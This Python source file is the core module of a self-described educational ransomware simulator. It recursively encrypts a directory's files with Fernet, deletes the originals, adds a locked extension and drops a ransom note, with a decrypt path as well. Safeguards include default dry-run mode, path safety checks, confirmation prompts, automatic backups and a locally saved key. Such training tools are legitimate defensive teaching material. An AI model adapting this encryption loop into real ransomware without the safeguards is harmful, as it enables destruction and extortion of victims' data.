"""
Encryptor - Core encryption and decryption functionality
⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️
"""
import os
from cryptography.fernet import Fernet
from .file_handler import FileHandler
from .key_manager import KeyManager
from .logger import SimulatorLogger
from .safety import SafetyChecker
from .ransom_note import RansomNote
import config

class RansomwareSimulator:
    """Main ransomware simulator class"""
    
    def __init__(self, dry_run=True):
        """Initialize the simulator"""
        self.dry_run = dry_run
        self.file_handler = FileHandler()
        self.key_manager = KeyManager()
        self.logger = SimulatorLogger()
        self.safety_checker = SafetyChecker()
        self.ransom_note = RansomNote()
        self.key = None
        self.cipher = None
        
        print(f"[+] Ransomware Simulator initialized")
        print(f"[+] Mode: {'DRY RUN (Safe Mode)' if dry_run else 'ACTIVE MODE'}")
    
    def set_dry_run(self, dry_run):
        """Toggle dry run mode"""
        self.dry_run = dry_run
        mode = "DRY RUN (Safe Mode)" if dry_run else "ACTIVE MODE"
        print(f"[+] Mode changed to: {mode}")
    
    def initialize_encryption(self):
        """Initialize encryption with a new or existing key"""
        if self.key_manager.key_exists():
            print("[?] Existing key found. Use it? (y/n): ", end='')
            use_existing = input().lower().strip() == 'y'
            
            if use_existing:
                self.key = self.key_manager.load_key()
                if self.key:
                    self.cipher = Fernet(self.key)
                    self.logger.log_info("Loaded existing encryption key")
                    return True
        
        # Generate new key
        self.key = self.key_manager.generate_key()
        self.cipher = Fernet(self.key)
        self.key_manager.save_key(self.key)
        self.logger.log_info("Generated new encryption key")
        return True
    
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Safety check
            is_safe, reason = self.safety_checker.is_path_safe(file_path)
            if not is_safe:
                self.logger.log_encryption(file_path, False, reason)
                return False
            
            # Read original file
            data = self.file_handler.read_file(file_path)
            if data is None:
                self.logger.log_encryption(file_path, False, "Could not read file")
                return False
            
            # Backup before encryption
            if config.ENABLE_AUTO_BACKUP:
                success, backup_path = self.file_handler.backup_file(file_path)
                if success:
                    self.logger.log_backup(file_path, backup_path, True)
            
            if self.dry_run:
                print(f"[DRY RUN] Would encrypt: {file_path}")
                self.logger.log_encryption(file_path, True, "Dry run mode")
                return True
            
            # Encrypt the data
            encrypted_data = self.cipher.encrypt(data)
            
            # Write encrypted data
            encrypted_path = file_path + config.ENCRYPTED_EXTENSION
            success = self.file_handler.write_file(encrypted_path, encrypted_data)
            
            if success:
                # Remove original file
                self.file_handler.delete_file(file_path)
                print(f"[+] Encrypted: {os.path.basename(file_path)}")
                self.logger.log_encryption(encrypted_path, True)
                return True
            else:
                self.logger.log_encryption(file_path, False, "Write failed")
                return False
                
        except Exception as e:
            error_msg = f"Encryption error: {str(e)}"
            print(f"[-] {error_msg} - {file_path}")
            self.logger.log_encryption(file_path, False, error_msg)
            return False
    
    def decrypt_file(self, file_path):
        """Decrypt a single file"""
        try:
            # Check if file is encrypted
            if not file_path.endswith(config.ENCRYPTED_EXTENSION):
                self.logger.log_decryption(file_path, False, "Not an encrypted file")
                return False
            
            # Read encrypted file
            encrypted_data = self.file_handler.read_file(file_path)
            if encrypted_data is None:
                self.logger.log_decryption(file_path, False, "Could not read file")
                return False
            
            if self.dry_run:
                print(f"[DRY RUN] Would decrypt: {file_path}")
                self.logger.log_decryption(file_path, True, "Dry run mode")
                return True
            
            # Decrypt the data
            try:
                decrypted_data = self.cipher.decrypt(encrypted_data)
            except Exception as e:
                self.logger.log_decryption(file_path, False, f"Decryption failed: {e}")
                print(f"[-] Decryption failed (wrong key?): {file_path}")
                return False
            
            # Get original filename (remove .locked extension)
            original_path = file_path[:-len(config.ENCRYPTED_EXTENSION)]
            
            # Write decrypted data
            success = self.file_handler.write_file(original_path, decrypted_data)
            
            if success:
                # Remove encrypted file
                self.file_handler.delete_file(file_path)
                print(f"[+] Decrypted: {os.path.basename(original_path)}")
                self.logger.log_decryption(original_path, True)
                return True
            else:
                self.logger.log_decryption(file_path, False, "Write failed")
                return False
                
        except Exception as e:
            error_msg = f"Decryption error: {str(e)}"
            print(f"[-] {error_msg} - {file_path}")
            self.logger.log_decryption(file_path, False, error_msg)
            return False
    
    def encrypt_directory(self, target_dir):
        """Encrypt all files in a directory"""
        print(f"\n[*] Starting encryption of directory: {target_dir}")
        
        # Safety checks
        is_safe, reason = self.safety_checker.is_directory_safe(target_dir)
        if not is_safe:
            print(f"[-] Safety check failed: {reason}")
            self.logger.log_error(f"Directory not safe: {reason}")
            return False
        
        # Display warning
        self.safety_checker.display_warning()
        
        # Get confirmation
        if not self.dry_run:
            if not self.safety_checker.get_confirmation(
                "⚠️  Proceed with ACTIVE encryption?", default=False
            ):
                print("[!] Operation cancelled by user")
                return False
        
        # Initialize encryption
        if not self.initialize_encryption():
            print("[-] Failed to initialize encryption")
            return False
        
        # Find files
        files = self.file_handler.find_files(target_dir)
        
        if not files:
            print("[-] No files found to encrypt")
            return False
        
        # Validate file count
        is_valid, message = self.safety_checker.validate_file_count(files)
        if not is_valid:
            print(f"[-] {message}")
            return False
        
        print(f"[*] Found {len(files)} files to encrypt")
        
        # Backup directory if enabled
        backup_path = None
        if config.ENABLE_AUTO_BACKUP and not self.dry_run:
            print("[*] Creating directory backup...")
            success, backup_path = self.file_handler.backup_directory(target_dir)
            if success:
                print(f"[+] Backup created at: {backup_path}")
        
        # Encrypt each file
        success_count = 0
        fail_count = 0
        
        for file_path in files:
            if self.encrypt_file(file_path):
                success_count += 1
            else:
                fail_count += 1
        
        # Generate ransom note
        if not self.dry_run:
            # Use backup_path if available, otherwise use backup directory path
            backup_loc = backup_path if backup_path else self.file_handler.backup_dir
            self.ransom_note.save(
                target_dir=target_dir,
                file_count=success_count,
                key_location=self.key_manager.key_file,
                backup_location=backup_loc
            )
        
        # Print summary
        print(f"\n[*] Encryption complete!")
        print(f"[+] Successful: {success_count}")
        print(f"[-] Failed: {fail_count}")
        
        self.logger.log_info(f"Encryption complete: {success_count} success, {fail_count} failed")
        
        return True
    
    def decrypt_directory(self, target_dir):
        """Decrypt all files in a directory"""
        print(f"\n[*] Starting decryption of directory: {target_dir}")
        
        # Load key
        if self.key is None:
            self.key = self.key_manager.load_key()
            if self.key is None:
                print("[-] No encryption key found!")
                print("[!] Cannot decrypt without the key")
                return False
            self.cipher = Fernet(self.key)
        
        # Find encrypted files
        encrypted_files = self.file_handler.find_encrypted_files(target_dir)
        
        if not encrypted_files:
            print("[-] No encrypted files found")
            return False
        
        print(f"[*] Found {len(encrypted_files)} encrypted files")
        
        # Get confirmation
        if not self.dry_run:
            if not self.safety_checker.get_confirmation(
                "Proceed with decryption?", default=True
            ):
                print("[!] Operation cancelled by user")
                return False
        
        # Decrypt each file
        success_count = 0
        fail_count = 0
        
        for file_path in encrypted_files:
            if self.decrypt_file(file_path):
                success_count += 1
            else:
                fail_count += 1
        
        # Print summary
        print(f"\n[*] Decryption complete!")
        print(f"[+] Successful: {success_count}")
        print(f"[-] Failed: {fail_count}")
        
        self.logger.log_info(f"Decryption complete: {success_count} success, {fail_count} failed")
        
        return True
    
    def generate_report(self):
        """Generate operation report"""
        self.logger.print_summary()
        report_path = self.logger.save_report()
        if report_path:
            print(f"[+] Detailed report saved to: {report_path}")
